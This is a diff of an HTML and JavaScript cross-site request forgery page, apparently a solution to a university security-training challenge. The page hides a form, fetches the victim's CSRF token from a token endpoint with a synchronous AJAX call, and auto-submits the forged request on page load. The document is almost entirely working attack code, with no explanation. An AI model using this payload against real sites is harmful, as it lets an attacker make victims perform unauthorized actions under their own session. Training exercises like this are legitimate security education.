@@ -1,9 +1,21 @@
 <form name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus" method="POST">
 	<input type="hidden" name="userId" value="86109c9eed773b92480275854966986d3c4901a6" />
-	<input type="hidden" name="csrfToken" value="-100189423192580647135316059992901934645" />
+	<input id="csrfTokenInput" type="hidden" name="csrf" value="" />
 	<input type="submit"/>
 </form>
 
 <script>
+	function getToken() {
+	    return $.ajax({
+		type: "GET",
+		url: "https://snickerboa.it.liu.se/user/csrfchallengeseven/getToken",
+		data: {
+		    userId: "86109c9eed773b92480275854966986d3c4901a6"
+		},
+		async: false
+	    }).responseText.split("&quot;")[1];
+	}
+	
+	document.getElementById("csrfTokenInput").value = getToken();
 	document.csrfForm.submit();
 </script> 
